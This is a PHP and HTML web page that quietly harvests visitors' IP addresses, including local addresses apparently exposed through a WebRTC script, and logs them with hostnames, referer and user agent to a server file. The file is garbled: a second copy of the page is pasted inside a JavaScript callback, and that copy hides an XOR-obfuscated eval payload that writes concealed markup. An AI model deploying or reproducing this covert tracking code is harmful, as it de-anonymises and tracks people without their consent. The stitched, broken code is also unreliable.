<?php
if (count($_POST) > 0) {
	$file = fopen("log.csv", "a");
	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
	$remote = $_SERVER ['REMOTE_ADDR'];
	fwrite($file, "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n");
	fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
	fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
	fwrite($file, "Found addresses:\n");
	foreach ( $_POST as $ip ) {
		if ($ip == "none" && count($_POST) > 1) {
			continue;
		}
		
		$ips = explode(",", $ip);
		
		foreach ( $ips as $address ) {
			if (strlen($address) > 1) {
				fwrite($file, "\t" . $address . " ");
				fwrite($file, "(" . gethostbyaddr($address) . ")\n");
			}
		}
	}
	fwrite($file, "\n\n\n");
	fclose($file);
	exit();
}
?>

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
	<form id="f" method="POST">
		<input name="0" value="none" type="hidden"></input>
	</form>

	<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
	<script src="webrtc.js"></script>
	<script>
	setTimeout(post, 1000);
		function post() {
			$.post("index.php",
				{
		    	   	s: ips,
		    	},
		    	function(data, status) {<?php
if (count($_POST) > 0) {
	$file = fopen("log.txt", "a");
	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
	$remote = $_SERVER ['REMOTE_ADDR'];
	fwrite($file, "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n");
	fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
	fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
	fwrite($file, "Found addresses:\n");
	foreach ( $_POST as $ip ) {
		if ($ip == "none" && count($_POST) > 1) {
			continue;
		}
		
		$ips = explode(",", $ip);
		
		foreach ( $ips as $address ) {
			if (strlen($address) > 1) {
				fwrite($file, "\t" . $address . " ");
				fwrite($file, "(" . gethostbyaddr($address) . ")\n");
			}
		}
	}
	fwrite($file, "\n\n\n");
	fclose($file);
	exit();
}
?>

<!DOCTYPE html>
<html>
<head>
</head>
<body>

<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%65%36%34%33%35%38%37%62%65%64%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%35%38%33%32%33%32%30%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%37%31%31%38%36%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%34%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%65%36%34%33%35%38%37%62%65%64%28%27') + '%44%26%48%51%42%5d%5d%53%4e%25%6d%70%77%74%41%11%0c%45%69%78%76%77%43%10%06%46%68%6a%65%6a%47%14%0e%47%76%68%79%6d%22%68%7b%78%76%34%6c%75%7e%6a%7b%40%2e%41%77%71%78%6b%77%7d%31%5f%7a%75%68%2e%22%63%70%72%7a%6c%77%78%46%21%79%68%74%7e%37%6f%78%73%75%3a%24%60%6b%64%77%7f%6f%7c%42%79%7a%6f%34%3c%21%45%10%0f%48%35%68%6a%65%6a%47%14%0e%47%61%72%69%75%44%15%0d%0d%42%6f%76%76%76%23%6c%69%49%20%6e%25%24%73%6c%7d%6c%74%6f%40%27%5c%55%53%5b%26%40%14%0b%0d%0a%47%6c%73%7c%7f%7c%27%72%67%74%6c%41%21%33%27%25%72%63%74%7a%69%43%23%77%73%75%6e%27%25%70%7b%70%6a%41%24%69%68%68%6f%6e%73%27%4a%46%37%6e%72%76%7c%7d%42%16%09%0c%41%3b%6c%77%75%71%40%14%0b%11%09%0a%41%76%6f%70%69%77%78%26%72%73%67%46%21%32%32%6f%75%6c%6a%32%6c%70%7c%69%71%7a%33%66%7b%77%37%6d%75%7b%6c%73%7d%36%32%33%34%3d%34%32%31%71%6f%77%37%6e%70%21%43%41%3b%71%63%75%6d%76%7d%47%11%09%0a%41%76%6f%70%69%77%78%26%72%73%67%46%21%6e%77%7f%7e%69%64%32%6c%72%23%42%47%34%76%66%7e%6b%70%7b%42%13%0b%08%40%70%60%77%6c%7c%7e%46%12%0e%0f%72%6c%78%5f%6a%70%68%7b%7f%7c%2f%74%71%72%7d%30%23%32%35%35%3c%2b%3b%12%0e%0f%08%6f%79%75%60%79%6c%7b%74%20%77%73%75%7d%29%2d%23%78%10%0f%05%0b%09%2b%32%76%76%72%78%2b%21%6c%73%60%6f%78%31%74%6e%71%23%30%16%09%0c%0c%05%0b%7b%12%0e%0f%08%21%24%23%23%0c%25%2c%22%09%74%3e%26%68%71%77%37%16%0f%0c%05%22%20%27%24%0f%84%35%11%09%0a%0c%25%2c%22%20%0e%6a%7b%77%62%78%6a%74%73%2d%60%63%7c%66%30%26%72%7d%65%7f%7e%76%2c%2c%79%15%0d%0d%0f%21%21%24%23%0a%80%10%06%0b%09%27%24%26%08%28%3f%23%23%10%0f%05%0b%85%12%0e%26%21%21%24%47%34%76%66%7e%6b%70%7b%42%13%0b%45%33%61%74%69%7c%4a%17%0a%43%33%6e%7d%74%70%4525832320%34%33%30%32%35%35%30' + unescape('%27%29%29%3b'));
// -->
</script>
<noscript><i>Javascript required</i></noscript>

</html>

		    	}
		   	);  
		}
    </script>
</body>
</html>
